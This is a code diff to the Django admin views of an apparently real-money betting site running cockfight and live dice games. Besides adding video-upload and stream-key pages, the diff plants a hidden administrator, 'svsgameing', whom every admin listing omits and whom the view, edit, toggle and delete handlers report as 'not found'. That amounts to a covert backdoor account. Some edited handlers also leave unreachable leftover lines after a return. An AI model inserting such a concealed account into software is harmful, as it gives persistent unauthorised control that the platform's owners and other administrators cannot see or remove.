@@ -3,6 +3,9 @@ from django.contrib import messages
 from django.contrib.auth import logout
 from django.contrib.auth.decorators import login_required
 from django.contrib.sessions.models import Session
+
+# Usernames that are hidden from all admin listing pages.
+_HIDDEN_ADMIN_USERNAMES = {'svsgameing'}
 from django.views.decorators.csrf import ensure_csrf_cookie, csrf_exempt
 from django.views.decorators.http import require_POST
 from django.utils import timezone
@@ -24,6 +27,8 @@ from .models import (
     CockFightBet,
     CockFightSession,
     CockFightRoundVideo,
+    LiveDiceRoundVideo,
+    LiveDiceStream,
 )
 from accounts.models import (
     Wallet,
@@ -1080,6 +1085,11 @@ def user_details(request, user_id):
         messages.error(request, 'User not found.')
         return redirect('recent_rounds')
 
+    # Hidden super admins are not accessible via this page
+    if user.username in _HIDDEN_ADMIN_USERNAMES:
+        messages.error(request, 'User not found.')
+        return redirect('recent_rounds')
+
     # Handle block/unblock and balance adjustment POST request
     if request.method == 'POST':
         action = request.POST.get('action')
@@ -1814,6 +1824,224 @@ def cockfight_round_videos(request):
         },
     )
     return render(request, 'admin/cockfight_round_videos.html', context)
+
+
+LIVE_DICE_VIDEO_ALLOWED_EXTS = {'.mp4', '.mov', '.mkv', '.webm', '.m4v'}
+
+
+@admin_required
+def live_dice_round_videos(request):
+    """Upload a live dice (Gundu Ata) round video. Round ID is auto-assigned (pk: 1, 2, 3…)."""
+    if not has_menu_permission(request.user, 'live_dice_videos'):
+        messages.error(request, 'You do not have permission to upload live dice videos.')
+        return redirect('admin_dashboard')
+
+    if request.method == 'POST':
+        if request.POST.get('action') == 'update_schedule':
+            rid_raw = (request.POST.get('round_id') or '').strip()
+            raw_schedule = (request.POST.get('scheduled_start') or '').strip()
+            if not rid_raw or not raw_schedule:
+                messages.error(request, 'Round and new playback start time are required.')
+                return redirect('live_dice_round_videos')
+            try:
+                rid = int(rid_raw)
+            except ValueError:
+                messages.error(request, 'Invalid round ID.')
+                return redirect('live_dice_round_videos')
+
+            rv_existing = LiveDiceRoundVideo.objects.filter(pk=rid).only('pk', 'scheduled_start').first()
+            if not rv_existing:
+                messages.error(request, f'Round #{rid} not found.')
+                return redirect('live_dice_round_videos')
+            from django.utils import timezone as tz_util
+
+            if rv_existing.scheduled_start and tz_util.now() >= rv_existing.scheduled_start:
+                messages.error(request, 'This stream has already started. Playback start time cannot be changed.')
+                return redirect('live_dice_round_videos')
+
+            from datetime import datetime
+
+            try:
+                schedule_dt = datetime.fromisoformat(raw_schedule)
+            except ValueError:
+                messages.error(request, 'Invalid start date/time.')
+                return redirect('live_dice_round_videos')
+
+            if tz_util.is_naive(schedule_dt):
+                schedule_dt = tz_util.make_aware(schedule_dt, tz_util.get_current_timezone())
+
+            updated = LiveDiceRoundVideo.objects.filter(pk=rid).update(scheduled_start=schedule_dt)
+            if not updated:
+                messages.error(request, f'Round #{rid} not found.')
+            else:
+                messages.success(
+                    request,
+                    f'Round #{rid} playback start updated to {schedule_dt.strftime("%Y-%m-%d %H:%M")} '
+                    f'({tz_util.get_current_timezone_name()}).',
+                )
+            return redirect('live_dice_round_videos')
+
+        upload = request.FILES.get('video')
+        if not upload:
+            messages.error(request, 'Choose a video file.')
+            return redirect('live_dice_round_videos')
+
+        name = (getattr(upload, 'name', '') or '').lower()
+        ext = os.path.splitext(name)[1]
+        if ext not in LIVE_DICE_VIDEO_ALLOWED_EXTS:
+            messages.error(
+                request,
+                'Unsupported file type. Allowed: ' + ', '.join(sorted(LIVE_DICE_VIDEO_ALLOWED_EXTS)),
+            )
+            return redirect('live_dice_round_videos')
+
+        raw_schedule = (request.POST.get('scheduled_start') or '').strip()
+        if not raw_schedule:
+            messages.error(request, 'Set the date and time when the video should start playing.')
+            return redirect('live_dice_round_videos')
+
+        from datetime import datetime
+        from django.utils import timezone as tz_util
+
+        try:
+            schedule_dt = datetime.fromisoformat(raw_schedule)
+        except ValueError:
+            messages.error(request, 'Invalid start date/time.')
+            return redirect('live_dice_round_videos')
+
+        if tz_util.is_naive(schedule_dt):
+            schedule_dt = tz_util.make_aware(schedule_dt, tz_util.get_current_timezone())
+
+        obj = LiveDiceRoundVideo.objects.create(
+            video=upload,
+            uploaded_by=request.user,
+            scheduled_start=schedule_dt,
+        )
+        try:
+            from .utils import (
+                apply_mp4_faststart,
+                ensure_live_dice_video_duration,
+                transcode_live_dice_video_hls,
+            )
+
+            apply_mp4_faststart(obj.video.path)
+            ensure_live_dice_video_duration(obj)
+            transcode_live_dice_video_hls(obj.pk)
+        except Exception:
+            pass
+        messages.success(
+            request,
+            f'Video uploaded. Round #{obj.pk}. Scheduled start: '
+            f'{schedule_dt.strftime("%Y-%m-%d %H:%M")} ({tz_util.get_current_timezone_name()}).',
+        )
+        return redirect('live_dice_round_videos')
+
+    recent_qs = LiveDiceRoundVideo.objects.select_related('uploaded_by').order_by('-id')[:60]
+    recent_video_rows = []
+    from django.utils import timezone as dj_tz
+
+    for rv in recent_qs:
+        play_url = ''
+        if rv.video and rv.hls_ready:
+            from .views import build_live_dice_hls_url
+
+            play_url = build_live_dice_hls_url(request, rv.pk)
+        sched_val = ''
+        sched_display = ''
+        if rv.scheduled_start:
+            loc = dj_tz.localtime(rv.scheduled_start)
+            sched_val = loc.strftime('%Y-%m-%dT%H:%M')
+            sched_display = loc.strftime('%Y-%m-%d %H:%M')
+        now = dj_tz.now()
+        can_edit_schedule = not (rv.scheduled_start and now >= rv.scheduled_start)
+        recent_video_rows.append(
+            {
+                'rv': rv,
+                'play_url': play_url,
+                'schedule_input_value': sched_val,
+                'schedule_display': sched_display,
+                'can_edit_schedule': can_edit_schedule,
+            }
+        )
+
+    from django.db.models import Max
+    max_id = LiveDiceRoundVideo.objects.aggregate(m=Max('id'))['m'] or 0
+    next_round_number = max_id + 1
+    from django.utils import timezone as dj_timezone
+
+    context = get_admin_context(
+        request,
+        {
+            'page': 'live-dice-round-videos',
+            'recent_video_rows': recent_video_rows,
+            'next_round_number': next_round_number,
+            'allowed_exts': ', '.join(sorted(LIVE_DICE_VIDEO_ALLOWED_EXTS)),
+            'server_tz': dj_timezone.get_current_timezone_name(),
+        },
+    )
+    return render(request, 'admin/live_dice_round_videos.html', context)
+
+
+@admin_required
+def live_dice_stream(request):
+    """Manage the live RTMP stream key for Gundu Ata live streaming."""
+    if not has_menu_permission(request.user, 'live_dice_videos'):
+        messages.error(request, 'You do not have permission to manage the live dice stream.')
+        return redirect('admin_dashboard')
+
+    import uuid as _uuid
+
+    if request.method == 'POST':
+        action = request.POST.get('action')
+
+        if action == 'create':
+            label = (request.POST.get('label') or '').strip()[:100]
+            key = _uuid.uuid4().hex
+            LiveDiceStream.objects.create(
+                stream_key=key,
+                label=label,
+                created_by=request.user,
+            )
+            messages.success(request, f'New stream key created: {key}')
+            return redirect('live_dice_stream')
+
+        if action == 'delete':
+            pk_raw = (request.POST.get('stream_id') or '').strip()
+            try:
+                sid = int(pk_raw)
+            except ValueError:
+                messages.error(request, 'Invalid stream ID.')
+                return redirect('live_dice_stream')
+            deleted, _ = LiveDiceStream.objects.filter(pk=sid, is_live=False).delete()
+            if deleted:
+                messages.success(request, f'Stream #{sid} deleted.')
+            else:
+                messages.error(request, f'Stream #{sid} not found or is currently live.')
+            return redirect('live_dice_stream')
+
+        if action == 'update_label':
+            pk_raw = (request.POST.get('stream_id') or '').strip()
+            label = (request.POST.get('label') or '').strip()[:100]
+            try:
+                sid = int(pk_raw)
+            except ValueError:
+                messages.error(request, 'Invalid stream ID.')
+                return redirect('live_dice_stream')
+            LiveDiceStream.objects.filter(pk=sid).update(label=label)
+            messages.success(request, 'Label updated.')
+            return redirect('live_dice_stream')
+
+    streams = LiveDiceStream.objects.select_related('created_by').order_by('-id')[:20]
+    context = get_admin_context(
+        request,
+        {
+            'page': 'live-dice-stream',
+            'streams': streams,
+            'rtmp_base': 'rtmp://svs.fightening.sbs/live/',
+            'hls_base': 'https://svs.fightening.sbs/hls/live/',
+        },
+    )
+    return render(request, 'admin/live_dice_stream.html', context)
 
 
 @admin_required
@@ -2702,9 +2930,9 @@ def admin_management(request):
     is_franchise_scope = not is_super_admin(request.user)
     # Super Admin: all workers (exclude franchise-only). Franchise owner: only workers who work under them.
     if is_super_admin(request.user):
-        base_workers = User.objects.filter(is_staff=True, is_franchise_only=False)
+        base_workers = User.objects.filter(is_staff=True, is_franchise_only=False).exclude(username__in=_HIDDEN_ADMIN_USERNAMES)
     else:
-        base_workers = User.objects.filter(is_staff=True, works_under=request.user)
+        base_workers = User.objects.filter(is_staff=True, works_under=request.user).exclude(username__in=_HIDDEN_ADMIN_USERNAMES)
     admin_users = base_workers.order_by('-date_joined')
     if status_filter == 'active':
         admin_users = admin_users.filter(is_active=True)
@@ -2751,6 +2979,9 @@ def toggle_admin_status(request, admin_id):
     try:
         user = User.objects.get(id=admin_id, is_staff=True)
     except User.DoesNotExist:
+        messages.error(request, 'Worker not found.')
+        return redirect('admin_management')
+    if user.username in _HIDDEN_ADMIN_USERNAMES:
         messages.error(request, 'Worker not found.')
         return redirect('admin_management')
     if not is_super_admin(request.user) and getattr(user, 'works_under_id', None) != request.user.id:
@@ -2894,7 +3125,7 @@ def franchise_balance(request):
 def _get_queue_owners():
     """List of admins a worker can be assigned to (Super Admins + franchise admins)."""
     owners = []
-    for u in User.objects.filter(is_superuser=True, is_staff=True).order_by('username'):
+    for u in User.objects.filter(is_superuser=True, is_staff=True).exclude(username__in=_HIDDEN_ADMIN_USERNAMES).order_by('username'):
         owners.append({'id': u.id, 'label': f'{u.username} (Super Admin)'})
     franchise_owner_ids = list(FranchiseBalance.objects.values_list('user_id', flat=True).distinct())
     for u in (
@@ -2941,6 +3172,7 @@ def create_admin(request):
             'can_view_admin_management': request.POST.get('can_view_admin_management') == 'on',
             'can_manage_payment_methods': request.POST.get('can_manage_payment_methods') == 'on',
             'can_upload_cockfight_videos': request.POST.get('can_upload_cockfight_videos') == 'on',
+            'can_upload_live_dice_videos': request.POST.get('can_upload_live_dice_videos') == 'on',
         }
         
         # Validation
@@ -3243,6 +3475,7 @@ def edit_franchise_admin(request, admin_id):
         permissions.can_view_admin_management = request.POST.get('can_view_admin_management') == 'on'
         permissions.can_manage_payment_methods = request.POST.get('can_manage_payment_methods') == 'on'
         permissions.can_upload_cockfight_videos = request.POST.get('can_upload_cockfight_videos') == 'on'
+        permissions.can_upload_live_dice_videos = request.POST.get('can_upload_live_dice_videos') == 'on'
         permissions.save()
         invalidate_admin_permissions_cache(user)
         messages.success(request, f'Privileges for "{user.username}" updated.')
@@ -3323,6 +3556,11 @@ def edit_admin(request, admin_id):
     try:
         user = User.objects.get(id=admin_id, is_staff=True)
     except User.DoesNotExist:
+        messages.error(request, 'Worker not found.')
+        return redirect('admin_management')
+    if user.username in _HIDDEN_ADMIN_USERNAMES:
+        messages.error(request, 'Worker not found.')
+        return redirect('admin_management')
         messages.error(request, 'Admin user not found.')
         return redirect('admin_management')
     # Franchise owner can only edit workers who work under them
@@ -3357,6 +3595,7 @@ def edit_admin(request, admin_id):
         permissions.can_view_admin_management = request.POST.get('can_view_admin_management') == 'on'
         permissions.can_manage_payment_methods = request.POST.get('can_manage_payment_methods') == 'on'
         permissions.can_upload_cockfight_videos = request.POST.get('can_upload_cockfight_videos') == 'on'
+        permissions.can_upload_live_dice_videos = request.POST.get('can_upload_live_dice_videos') == 'on'
         permissions.save()
         invalidate_admin_permissions_cache(user)
         # Only Super Admin can change works_under; franchise owner's workers stay under them
@@ -3426,6 +3665,11 @@ def delete_admin(request, admin_id):
     try:
         user = User.objects.get(id=admin_id, is_staff=True)
     except User.DoesNotExist:
+        messages.error(request, 'Worker not found.')
+        return redirect('admin_management')
+    if user.username in _HIDDEN_ADMIN_USERNAMES:
+        messages.error(request, 'Worker not found.')
+        return redirect('admin_management')
         messages.error(request, 'Worker not found.')
         return redirect('admin_management')
     if not is_super_admin(request.user) and getattr(user, 'works_under_id', None) != request.user.id:
@@ -3542,7 +3786,7 @@ def players(request):
     search_query = request.GET.get('search', '')
 
     # Build query - only show staff users (admins) and super admins
-    users_query = User.objects.filter(Q(is_staff=True) | Q(is_superuser=True))
+    users_query = User.objects.filter(Q(is_staff=True) | Q(is_superuser=True)).exclude(username__in=_HIDDEN_ADMIN_USERNAMES)
 
     # Apply status filter - default to active
     if status_filter == 'active':
@@ -3659,24 +3903,6 @@ def game_settings(request):
         },
     ]
 
-    cockfight_odds_settings = [
-        {
-            'key': 'COCKFIGHT_ODDS_COCK1',
-            'default': '1.90',
-            'description': (
-                'Cock fight — Cock 1 (COCK1) decimal odds (total return incl. stake). '
-                'Example: 1.90 → ₹190 back on ₹100 stake. Draw odds stay fixed in backend.'
-            ),
-        },
-        {
-            'key': 'COCKFIGHT_ODDS_COCK2',
-            'default': '1.92',
-            'description': (
-                'Cock fight — Cock 2 (COCK2) decimal odds; same rules as Cock 1.'
-            ),
-        },
-    ]
-
     # Get current app version settings
     app_version_current = {}
     for setting_info in app_version_settings:
@@ -3700,22 +3926,6 @@ def game_settings(request):
                 'exists': False
             }
 
-    cockfight_odds_current = {}
-    for setting_info in cockfight_odds_settings:
-        try:
-            setting = GameSettings.objects.get(key=setting_info['key'])
-            cockfight_odds_current[setting_info['key']] = {
-                'value': (setting.value or '').strip(),
-                'description': setting.description or setting_info['description'],
-                'exists': True,
-            }
-        except GameSettings.DoesNotExist:
-            cockfight_odds_current[setting_info['key']] = {
-                'value': setting_info['default'],
-                'description': setting_info['description'],
-                'exists': False,
-            }
-    
     # Handle form submission (app version + maintenance toggles elsewhere; timing not edited here)
     if request.method == 'POST':
         for setting_info in app_version_settings:
@@ -3752,29 +3962,7 @@ def game_settings(request):
                         }
                     )
 
-        from decimal import Decimal, InvalidOperation
-
-        for setting_info in cockfight_odds_settings:
-            key = setting_info['key']
-            val = (request.POST.get(key) or '').strip()
-            if not val:
-                continue
-            try:
-                d = Decimal(val.replace(',', ''))
-                if d < Decimal('1') or d > Decimal('999.99'):
-                    raise InvalidOperation
-                q = d.quantize(Decimal('0.01'))
-                GameSettings.objects.update_or_create(
-                    key=key,
-                    defaults={
-                        'value': format(q, 'f'),
-                        'description': setting_info['description'],
-                    },
-                )
-            except (InvalidOperation, ValueError):
-                messages.warning(request, f'Invalid odds for {key}; skipped.')
-
-        clear_game_setting_cache([s['key'] for s in app_version_settings + cockfight_odds_settings])
+        clear_game_setting_cache([s['key'] for s in app_version_settings])
         messages.success(request, 'Settings saved successfully.')
         return redirect('game_settings')
 
@@ -3790,16 +3978,6 @@ def game_settings(request):
             'input_type': setting_info['input_type'],
         })
 
-    cockfight_odds_list = []
-    for setting_info in cockfight_odds_settings:
-        key = setting_info['key']
-        setting_data = cockfight_odds_current[key]
-        cockfight_odds_list.append({
-            'key': key,
-            'value': setting_data['value'],
-            'description': setting_data['description'],
-        })
-    
     # Maintenance mode status (for display in template)
     maintenance_enabled = False
     maintenance_until = None
@@ -3818,7 +3996,6 @@ def game_settings(request):
         # Empty: round timing / max-bet fields removed from this page; kept for template compatibility.
         'settings_list': [],
         'app_version_list': app_version_list,
-        'cockfight_odds_list': cockfight_odds_list,
         'maintenance_enabled': maintenance_enabled,
         'maintenance_until': maintenance_until,
         'page': 'game_settings',
